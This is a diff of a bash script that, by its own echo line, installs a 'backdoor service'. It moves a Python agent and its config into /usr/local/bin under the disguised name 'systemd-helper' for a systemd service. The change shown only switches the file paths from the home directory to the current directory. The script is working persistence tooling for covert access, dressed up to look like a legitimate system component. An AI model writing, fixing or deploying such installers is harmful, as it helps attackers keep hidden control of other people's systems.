@@ -3,6 +3,7 @@
 # === CONFIG ===
 SERVICE_NAME="systemd-helper"
 AGENT_NAME="systemd-helper.py"
+CURRENT_PATH=$(pwd)
 INSTALL_PATH="/usr/local/bin"
 SERVICE_PATH="/etc/systemd/system"
 
@@ -10,12 +11,12 @@ echo "[+] Installing backdoor service..."
 
 # === Move agent ===
 echo "[+] Moving agent to $INSTALL_PATH..."
-sudo mv ~/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py
+sudo mv $CURRENT_PATH/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py
 
 # === Move config ===
-if [ -f ~/config.json ]; then
+if [ -f $CURRENT_PATH/config.json ]; then
     echo "[+] Moving config.json..."
-    sudo mv ~/config.json $INSTALL_PATH/config.json
+    sudo mv $CURRENT_PATH/config.json $INSTALL_PATH/config.json
 fi
 
 # === Set permissions ===
